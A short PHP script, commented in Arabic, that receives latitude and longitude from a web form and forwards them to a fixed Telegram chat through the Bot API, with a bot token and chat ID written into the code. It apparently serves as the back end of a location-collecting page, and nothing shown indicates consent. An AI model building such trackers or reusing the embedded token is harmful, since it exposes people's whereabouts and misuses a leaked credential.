<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $latitude = $_POST['latitude'];
    $longitude = $_POST['longitude'];

    // بيانات البوت
    $botToken = "7696791585:AAEB_B__emATrrg7l-8dhozYZ0bx-LlDgoQ"; // ضع هنا رمز البوت الخاص بك
    $chatId = "6758094969"; // ضع هنا معرّف المحادثة

    // صيغة الرسالة
    $message = "📍 *إحداثيات جديدة:* \n";
    $message .= "Latitude: " . $latitude . "\n";
    $message .= "Longitude: " . $longitude;

    // عنوان الـ API الخاص بتليجرام
    $telegramApiUrl = "https://api.telegram.org/bot" . $botToken . "/sendMessage";

    // إعداد البيانات التي سيتم إرسالها
    $postData = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'Markdown', // لتنسيق الرسالة
    ];

    // إرسال البيانات باستخدام cURL
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $telegramApiUrl);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    $response = curl_exec($ch);
    curl_close($ch);

    // التحقق من نجاح الإرسال
    if ($response) {
        echo "تم إرسال الإحداثيات إلى تليجرام بنجاح!";
    } else {
        echo "حدث خطأ أثناء إرسال الإحداثيات.";
    }
}
?>
